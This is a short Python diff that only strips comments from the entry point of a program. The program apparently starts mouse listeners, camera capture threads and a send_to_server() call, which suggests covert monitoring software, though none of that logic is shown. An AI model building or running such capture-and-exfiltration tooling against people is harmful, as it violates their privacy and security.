@@ -291,7 +291,7 @@ def start_listeners():
     mouse_listener.join()
 
 
-# Your actual main function (rename if needed)
+
 def your_main_function():
     send_to_server()
     thread1 = threading.Thread(target=camera)
@@ -301,8 +301,6 @@ def your_main_function():
     thread2.start()
     thread3.start()
 
-# ====================================================
-# KEEP THIS PART AS IS
-# ====================================================
+
 if __name__ == "__main__":
-    your_main_function()  # Change this to YOUR main function name
+    your_main_function() 
